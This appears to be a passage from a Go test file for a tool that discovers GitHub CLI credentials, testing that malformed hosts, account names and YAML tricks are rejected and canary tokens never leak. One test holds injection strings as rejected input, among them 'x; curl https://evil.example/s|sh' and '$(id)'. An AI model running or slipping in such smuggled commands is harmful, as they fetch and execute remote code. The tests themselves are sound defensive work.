	bad := []string{"github.com@evil.example", "-oops", "ghe example.com", "ghe\x01.example.com"}
	body := "ghe.example.com:\n  user: bob\nlocalhost:3000:\n  user: carol\n"
	for _, k := range bad {
		body += fmt.Sprintf("%q:\n  user: mallory\n", k)
	}
	home := t.TempDir()
	writeHosts(t, filepath.Join(home, ".config"), body)
	f := &fakeRunner{out: ghAnswer("mallory")}
	s := New(f)
	creds, err := s.Discover(envOf(home, map[string]string{"GH_TOKEN": canary, "GH_ENTERPRISE_TOKEN": canary, "GH_HOST": "-bad host"}))
	if err != nil {
		t.Fatal(err)
	}
	if got := ids(creds); !reflect.DeepEqual(got, []string{"@ghe.example.com", "@github.com", "@localhost:3000", "bob@ghe.example.com", "carol@localhost:3000"}) {
		t.Fatalf("ids %v", got)
	}
	for _, c := range creds {
		if !reflect.DeepEqual(c.Notes, []string{"ignored 4 entries with an invalid host name or value in the gh hosts file", "ignored GH_HOST: invalid host name"}) {
			t.Errorf("%s notes %q", c.ID, c.Notes)
		}
		s.Resolve(context.Background(), c) // the answer is irrelevant; only the command line is inspected
	}
	all := fmt.Sprintf("%+v %q", creds, f.args)
	for _, k := range append(bad, "mallory", "evil", "-bad host") {
		if strings.Contains(all, k) || strings.Contains(all, fmt.Sprintf("%q", k)) {
			t.Errorf("rejected text %q reached %s", k, all)
		}
	}
}

func discoverBody(t *testing.T, body string, vars map[string]string) ([]model.Credential, error) {
	t.Helper()
	home := t.TempDir()
	writeHosts(t, filepath.Join(home, ".config"), body)
	return New(nil).Discover(envOf(home, vars))
}

func TestDiscoverRejectsInvalidAccountNames(t *testing.T) {
	bad := []string{"x; curl https://evil.example/s|sh", "$(id)", "`id`", "a b", `a"b`, "a'b", "-alice", "al\u200bice", "\u0430lice"}
	body := "github.com:\n  user: alice\n  users:\n    alice:\n    alice-b:\n    octo_corp:\n"
	for _, n := range bad {
		body += fmt.Sprintf("    %q:\n", n)
	}
	for i, n := range bad {
		body += fmt.Sprintf("h%d.example.com:\n  user: %q\n", i, n)
	}
	creds, err := discoverBody(t, body, nil)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"alice-b@github.com", "alice@github.com", "octo_corp@github.com"}
	for i := range bad {
		want = append(want, fmt.Sprintf("h%d.example.com", i)) // invalid user: legacy entry
	}
	sort.Strings(want)
	if got := ids(creds); !reflect.DeepEqual(got, want) {
		t.Fatalf("ids %v", got)
	}
	note := fmt.Sprintf("ignored %d accounts with an invalid name in the gh hosts file", 2*len(bad))
	all := fmt.Sprintf("%+v", creds)
	for _, c := range creds {
		if !contains(c.Notes, note) {
			t.Errorf("%s notes %q", c.ID, c.Notes)
		}
	}
	for _, n := range bad {
		if strings.Contains(all, n) || strings.Contains(all, fmt.Sprintf("%q", n)) {
			t.Errorf("rejected %q reached %s", n, all)
		}
	}
}

func TestDiscoverAliasNeverCopiesToken(t *testing.T) {
	for name, body := range map[string]string{
		"user value": "github.com:\n  oauth_token: &t " + canary + "\n  user: *t\n",
		"users key":  "github.com:\n  oauth_token: &t " + canary + "\n  user: alice\n  users:\n    *t :\n",
		"host key":   "&t " + canary + ":\n  user: bob\n*t :\n  user: alice\n",
	} {
		t.Run(name, func(t *testing.T) {
			creds, err := discoverBody(t, body, nil)
			out := fmt.Sprintf("%+v %v", creds, err)
			if strings.Contains(out, canary) {
				t.Fatalf("canary leaked: %s", out)
			}
		})
	}
}

func TestDiscoverEnvTokenKeepsPlainIDAgainstDecoyAccount(t *testing.T) {
	creds, err := discoverBody(t, "github.com:\n  user: alice\n  users:\n    alice:\n    GH_TOKEN:\n", map[string]string{"GH_TOKEN": canary})
	if err != nil {
		t.Fatal(err)
	}
	if c := credByID(t, creds, "@github.com"); c.Label != "GH_TOKEN@github.com" || c.Kind != "env-token" {
		t.Errorf("env: %+v", c)
	}
	if c := credByID(t, creds, "GH_TOKEN@github.com#2"); c.Kind != "file-host-inactive" || c.Label != "GH_TOKEN@github.com#2" {
		t.Errorf("decoy: %+v", c)
	}
}

func TestDiscoverOnlyInvalidHostKeepsNote(t *testing.T) {
	creds, err := discoverBody(t, "\"-oops\":\n  user: alice\n", nil)
	if err != nil || len(creds) != 1 || creds[0].ID != "unreadable" ||
		!reflect.DeepEqual(creds[0].Notes, []string{"ignored 1 entry with an invalid host name or value in the gh hosts file"}) {
		t.Fatalf("%+v %v", creds, err)
	}
	creds, err = discoverBody(t, "github.com:\n  users:\n    \"a b\":\n", nil)
	if err != nil || len(creds) != 1 || creds[0].ID != "github.com" || len(creds[0].Notes) != 1 {
		t.Fatalf("%+v %v", creds, err)
	}
}

func TestValidHostUnderscore(t *testing.T) {
	for h, ok := range map[string]bool{"my_ghe": true, "my_ghe.corp:8443": true, "_x": false, "x_": false, "x_.y": true} {
		if validHost.MatchString(h) != ok {
			t.Errorf("%q: want %v", h, ok)
		}
	}
}

func TestDiscoverLowercasesHosts(t *testing.T) {
	creds, err := discoverBody(t, "GitHub.com:\n  user: alice\n", map[string]string{"GH_TOKEN": canary, "GH_HOST": "GHE.Example.com", "GH_ENTERPRISE_TOKEN": canary})
	if err != nil {
		t.Fatal(err)
	}
	if got := ids(creds); !reflect.DeepEqual(got, []string{"@ghe.example.com", "@github.com", "alice@github.com"}) {
		t.Fatalf("ids %v", got)
	}
	if c := credByID(t, creds, "alice@github.com"); c.Host != "github.com" || c.Kind != "file-host" {
		t.Errorf("%+v", c)
	}
	creds, _ = discoverBody(t, "GitHub.com:\n  user: alice\ngithub.com:\n  user: alice\n", nil)
	if got := ids(creds); !reflect.DeepEqual(got, []string{"alice@github.com", "alice@github.com#2"}) {
		t.Fatalf("collision ids %v", got)
	}
}

func TestDiscoverHostOnlyCredentialWhenNoActiveUser(t *testing.T) {
	for name, userLine := range map[string]string{
		"missing":           "",
		"invalid":           "  user: \"a b\"\n",
		"invalid, unlisted": "  user: \"x;y\"\n",
		"sequence":          "  user: [alice, " + canary + "]\n",
		"mapping":           "  user: {k: " + canary + "}\n",
	} {
		t.Run(name, func(t *testing.T) {
			creds, err := discoverBody(t, "github.com:\n"+userLine+"  oauth_token: "+canary+"\n  users:\n    alice:\n    bob:\n", map[string]string{"GH_TOKEN": canary})
			if err != nil {
				t.Fatal(err)
			}
			if got := ids(creds); !reflect.DeepEqual(got, []string{"@github.com", "alice@github.com", "bob@github.com", "github.com"}) {
				t.Fatalf("ids %v", got)
			}
			h := credByID(t, creds, "github.com")
			if h.Kind != "file-host" || h.Label != "github.com" || h.Host != "github.com" || h.Identity != "" || h.Source != "file" || len(h.Files) != 1 {
				t.Errorf("host-only: %+v", h)
			}
			for _, id := range []string{"alice@github.com", "bob@github.com"} {
				if c := credByID(t, creds, id); c.Kind != "file-host-inactive" {
					t.Errorf("%s: %+v", id, c)
				}
			}
			if strings.Contains(fmt.Sprintf("%+v", creds), canary) {
				t.Error("canary leaked")
			}
		})
	}
}

func TestDiscoverNoHostOnlyCredentialWhenUserListed(t *testing.T) {
	creds, _ := discoverBody(t, "github.com:\n  user: alice\n  users:\n    alice:\n    bob:\n", nil)
	if got := ids(creds); !reflect.DeepEqual(got, []string{"alice@github.com", "bob@github.com"}) {
		t.Fatalf("ids %v", got)
	}
}

func TestResolveHostOnlyCredentialInEffect(t *testing.T) {
	body := "github.com:\n  users:\n    alice:\n    bob:\n"
	res, errs := resolveAll(t, body, nil, &fakeRunner{out: ghAnswer("carol")})
	if r := res["github.com"]; r == nil || r.Identity != "carol" || errs["github.com"] != nil {
		t.Fatalf("host-only: %+v %v", r, errs["github.com"])
	}
	if res["alice@github.com"] != nil || res["bob@github.com"] != nil {
		t.Error("inactive accounts were queried")
	}
	res, _ = resolveAll(t, body, map[string]string{"GH_TOKEN": canary}, &fakeRunner{out: ghAnswer("carol")})
	if res["github.com"] != nil || res["@github.com"] == nil {
		t.Errorf("env token must shadow host-only: %+v", res)
	}
}

func TestDiscoverNullRootIsEmpty(t *testing.T) {
	for name, body := range map[string]string{"dashes": "---\n", "null": "null\n", "tilde": "~\n", "dots": "---\n...\n", "empty": "", "comment": "# nothing here\n"} {
		t.Run(name, func(t *testing.T) {
			creds, err := discoverBody(t, body, nil)
			if err != nil || len(creds) != 0 {
				t.Fatalf("creds=%+v err=%v", creds, err)
			}
		})
	}
}

func TestDiscoverDuplicateHostsNote(t *testing.T) {
	note := func(cs []model.Credential) []string { return cs[0].Notes }
	creds, _ := discoverBody(t, "github.com:\n  user: alice\ngithub.com:\n  user: alice\n", nil)
	if got := ids(creds); !reflect.DeepEqual(got, []string{"alice@github.com", "alice@github.com#2"}) || !reflect.DeepEqual(note(creds), []string{"1 host name appears more than once in the gh hosts file"}) {
		t.Fatalf("exact: %v %q", got, note(creds))
	}
	if c := credByID(t, creds, "alice@github.com#2"); c.Label != "alice@github.com#2" {
		t.Errorf("%+v", c)
	}
	creds, _ = discoverBody(t, "GitHub.com:\n  user: alice\ngithub.com:\n  user: alice\nghe.x.com:\n  user: b\nGHE.x.com:\n  user: b\nghe.x.com:\n  user: b\nsolo.com:\n  user: c\n", nil)
	if !reflect.DeepEqual(note(creds), []string{"2 host names appear more than once in the gh hosts file"}) || len(creds) != 6 {
		t.Fatalf("case variants: %d %q", len(creds), note(creds))
	}
	creds, _ = discoverBody(t, "github.com:\n  user: alice\n", nil)
	if len(creds[0].Notes) != 0 {
		t.Errorf("unexpected note %q", creds[0].Notes)
	}
}

func TestDiscoverNonScalarUserCountsAsInvalid(t *testing.T) {
	creds, err := discoverBody(t, "github.com:\n  oauth_token: "+canary+"\n  user:\n    - "+canary+"\nghe.x.com:\n  user: bob\n", nil)
	if err != nil {
		t.Fatal(err)
	}
	if got := ids(creds); !reflect.DeepEqual(got, []string{"bob@ghe.x.com", "github.com"}) {
		t.Fatalf("ids %v", got)
	}
	if !contains(creds[0].Notes, "ignored 1 account with an invalid name in the gh hosts file") || strings.Contains(fmt.Sprintf("%+v", creds), canary) {
		t.Errorf("notes %q", creds[0].Notes)
	}
}

func TestDiscoverInvalidHostSingularNote(t *testing.T) {
	creds, _ := discoverBody(t, "\"-oops\":\n  user: a\nghe.x.com:\n  user: b\n", nil)
	if !reflect.DeepEqual(creds[0].Notes, []string{"ignored 1 entry with an invalid host name or value in the gh hosts file"}) {
		t.Errorf("%q", creds[0].Notes)
	}
}

func TestDiscoverUserMatchesUsersKeyIgnoringCase(t *testing.T) {
	creds, _ := discoverBody(t, "github.com:\n  user: Alice\n  users:\n    alice:\n    bob:\n", nil)
	if got := ids(creds); !reflect.DeepEqual(got, []string{"alice@github.com", "bob@github.com"}) {
		t.Fatalf("ids %v", got)
	}
	if c := credByID(t, creds, "alice@github.com"); c.Kind != "file-host" || c.Identity != "alice" {
		t.Errorf("%+v", c)
	}
	if c := credByID(t, creds, "bob@github.com"); c.Kind != "file-host-inactive" {
		t.Errorf("%+v", c)
	}
}

func TestDiscoverDuplicateUserKeyKeepsFirst(t *testing.T) {
	creds, _ := discoverBody(t, "github.com:\n  user: alice\n  user: bob\n", nil)
	if got := ids(creds); !reflect.DeepEqual(got, []string{"alice@github.com"}) {
		t.Fatalf("ids %v", got)
	}
	if c := credByID(t, creds, "alice@github.com"); c.Kind != "file-host" {
		t.Errorf("%+v", c)
	}
}

func TestDiscoverScalarHostEntryIsSkipped(t *testing.T) {
	creds, err := discoverBody(t, "github.com:\n  user: alice\nzz: 1\n", nil)
	if err != nil {
		t.Fatal(err)
	}
	if got := ids(creds); !reflect.DeepEqual(got, []string{"alice@github.com"}) {
		t.Fatalf("ids %v", got)
	}
	if !reflect.DeepEqual(creds[0].Notes, []string{"ignored 1 entry with an invalid host name or value in the gh hosts file"}) {
		t.Errorf("notes %q", creds[0].Notes)
	}
	creds, _ = discoverBody(t, "zz: 1\nyy: text\n", nil)
	if len(creds) != 1 || creds[0].ID != "unreadable" || !contains(creds[0].Notes, "ignored 2 entries with an invalid host name or value in the gh hosts file") {
		t.Errorf("only scalars: %+v", creds)
	}
}

func TestDiscoverTokenShapedAccountNamesRejected(t *testing.T) {
	var bad []string
	for _, p := range []string{"gho_", "ghp_", "GHU_", "ghs_", "ghr_", "github_pat_"} {
		bad = append(bad, p+strings.Repeat("A1b2", 9))
	}
	body := "github.com:\n  user: alice\n  users:\n    alice:\n"
	for _, n := range bad {
		body += "    " + n + ":\n"
	}
	for i, n := range bad {
		body += fmt.Sprintf("h%d.example.com:\n  user: %s\n", i, n)
	}
	creds, err := discoverBody(t, body, nil)
	if err != nil {
		t.Fatal(err)
	}
	if got := ids(creds); len(got) != 1+len(bad) || !contains(got, "alice@github.com") {
		t.Fatalf("ids %v", got)
	}
	if !contains(creds[0].Notes, fmt.Sprintf("ignored %d accounts with an invalid name in the gh hosts file", 2*len(bad))) {
		t.Errorf("notes %q", creds[0].Notes)
	}
	all := fmt.Sprintf("%+v", creds)
	for _, n := range bad {
		if strings.Contains(all, n) {
			t.Errorf("token-shaped name reached %s", all)
		}
	}
}

// junkCanary is token-shaped so that a name check rejects it; it must appear nowhere in the output.
const junkCanary = "ghp_CANARYCANARYCANARYCANARYCANARY0000"

func TestDiscoverJunkEntryNeverHidesLogins(t *testing.T) {
	c := junkCanary
	junk := map[string]string{
		"!!int user":        "zz:\n  user: !!int " + c + "\n",
		"!!float user":      "zz:\n  user: !!float " + c + "\n",
		"!!bool user":       "zz:\n  user: !!bool " + c + "\n",
		"!!timestamp user":  "zz:\n  user: !!timestamp " + c + "\n",
		"!!binary user":     "zz:\n  user: !!binary \"!!!" + c + "\"\n",
		"user sequence":     "zz:\n  user: [" + c + "]\n",
		"user mapping":      "zz:\n  user: {k: " + c + "}\n",
		"user alias":        "zz:\n  oauth_token: &t " + c + "\n  user: *t\n",
		"users scalar":      "zz:\n  users: " + c + "\n",
		"users sequence":    "zz:\n  users: [" + c + "]\n",
		"users alias":       "zz:\n  oauth_token: &t " + c + "\n  users: *t\n",
		"users seq keys":    "zz:\n  users:\n    ? [" + c + "]\n    : x\n    ? {a: " + c + "}\n    : y\n",
		"users tagged keys": "zz:\n  users:\n    !!int " + c + ":\n    !!binary \"!!!\":\n    !!float " + c + ":\n",
		"host scalar":       "zz: " + c + "\n",
		"host sequence":     "zz: [" + c + "]\n",
		"host alias scalar": "x: &t " + c + "\nzz: *t\n",
		"invalid host key":  "\"bad host " + c + "\":\n  user: " + c + "\n",
		"duplicate host":    "github.com:\n  oauth_token: " + c + "\n  user: !!int " + c + "\n",
		"deep nesting":      "zz:\n  other:\n    - {a: [" + c + ", {b: !!int " + c + "}]}\n    - !!binary \"!!!\"\n",
		"deep nesting key":  "zz:\n  ? [" + c + "]\n  : !!int " + c + "\n",
		"name with space":   "zz:\n  user: \"" + spaceCanary + "\"\n",
		"trailing newline":  "zz:\n  user: |\n    " + newlineCanary + "\n",
	}
	// The junk entry comes after, before and between valid hosts: stopping at the first bad entry must be caught.
	const alice, bob = "github.com:\n  user: alice\n", "zzz.example.com:\n  user: bob\n"
	layouts := map[string]func(j string) string{
		"junk last":  func(j string) string { return alice + j },
		"junk first": func(j string) string { return j + alice + bob },
		"junk mid":   func(j string) string { return alice + j + bob },
	}
	for name, j := range junk {
		for lname, layout := range layouts {
			t.Run(name+"/"+lname, func(t *testing.T) {
				creds, err := discoverBody(t, layout(j), nil)
				out := fmt.Sprintf("%+v %v", creds, err)
				for _, cn := range []string{c, spaceCanary, newlineCanary} {
					if strings.Contains(out, cn) {
						t.Fatalf("err %v canary in %s", err, out)
					}
				}
				if err != nil {
					t.Fatal(err)
				}
				a := credByID(t, creds, "alice@github.com")
				if a.Kind != "file-host" || a.Identity != "alice" || a.Host != "github.com" {
					t.Errorf("alice: %+v", a)
				}
				if lname != "junk last" {
					credByID(t, creds, "bob@zzz.example.com")
				}
				for _, cr := range creds {
					if cr.ID == "unreadable" {
						t.Errorf("unreadable placeholder: %+v", creds)
					}
				}
			})
		}
	}
}

// Canaries that are not token-shaped: only the name pattern rejects them.
const (
	spaceCanary   = "SPACE CANARY NAME"
	newlineCanary = "NEWLINECANARYNAME"
)

func TestDiscoverNonMappingRootIsUnreadable(t *testing.T) {
	for name, body := range map[string]string{
		"sequence root": "- " + canary + "\n",
		"scalar root":   canary + "\n",
		"int root":      "42\n",
	} {
		t.Run(name, func(t *testing.T) {
			creds, err := discoverBody(t, body, nil)
			if out := fmt.Sprintf("%+v %v", creds, err); strings.Contains(out, canary) {
				t.Errorf("canary leaked: %s", out)
			}
			if err != nil || len(creds) != 1 || creds[0].ID != "unreadable" || !contains(creds[0].Notes, "could not parse hosts file") {
				t.Errorf("creds: %+v err %v", creds, err)
			}
		})
	}
}

func TestDiscoverAliasHostEntryIsProcessed(t *testing.T) {
	creds, err := discoverBody(t, "a.example.com: &x {user: bob}\nb.example.com: *x\n", nil)
	if err != nil || !reflect.DeepEqual(ids(creds), []string{"bob@a.example.com", "bob@b.example.com"}) {
		t.Fatalf("%v %+v", err, creds)
	}
	// names inside an aliased mapping are validated as usual
	creds, _ = discoverBody(t, "a.example.com: &x {user: \"a b\"}\nb.example.com: *x\n", nil)
	if !reflect.DeepEqual(ids(creds), []string{"a.example.com", "b.example.com"}) || !contains(creds[0].Notes, "ignored 2 accounts with an invalid name in the gh hosts file") {
		t.Errorf("invalid names: %+v", creds)
	}
	// an alias to a scalar is an invalid entry and never echoed
	creds, err = discoverBody(t, "github.com:\n  user: alice\nx: &t "+junkCanary+"\nzz: *t\n", nil)
	if err != nil || !reflect.DeepEqual(ids(creds), []string{"alice@github.com"}) || strings.Contains(fmt.Sprintf("%+v", creds), junkCanary) ||
		!contains(creds[0].Notes, "ignored 2 entries with an invalid host name or value in the gh hosts file") { // x itself is a scalar too
		t.Errorf("scalar alias: %v %+v", err, creds)
	}
}

func TestDiscoverDuplicateUsersKeyKeepsFirst(t *testing.T) {
	for name, body := range map[string]string{
		"mapping first": "github.com:\n  user: alice\n  users:\n    alice:\n  users:\n    bob:\n",
		"scalar first":  "github.com:\n  user: alice\n  users: x\n  users:\n    bob:\n",
	} {
		creds, _ := discoverBody(t, body, nil)
		want := []string{"alice@github.com"}
		if name == "scalar first" {
			want = []string{"alice@github.com"} // the scalar users: wins and is ignored; bob never appears
		}
		if got := ids(creds); !reflect.DeepEqual(got, want) || creds[0].Kind != "file-host" {
			t.Errorf("%s: %v", name, ids(creds))
		}
	}
}

func TestDiscoverAccountNameLength(t *testing.T) {
	hex40 := strings.Repeat("ab12", 10)
	ok39 := strings.Repeat("a", 39)
	creds, err := discoverBody(t, "github.com:\n  user: "+hex40+"\nghe.x.com:\n  user: "+ok39+"\nh3.x.com:\n  user: alice\n  users:\n    alice:\n    "+hex40+":\n    "+ok39+"b:\n", nil)
	if err != nil {
		t.Fatal(err)
	}
	if got := ids(creds); !reflect.DeepEqual(got, []string{ok39 + "@ghe.x.com", "alice@h3.x.com", "github.com"}) {
		t.Fatalf("ids %v", got)
	}
	if strings.Contains(fmt.Sprintf("%+v", creds), hex40) {
		t.Error("40-character name echoed")
	}
}
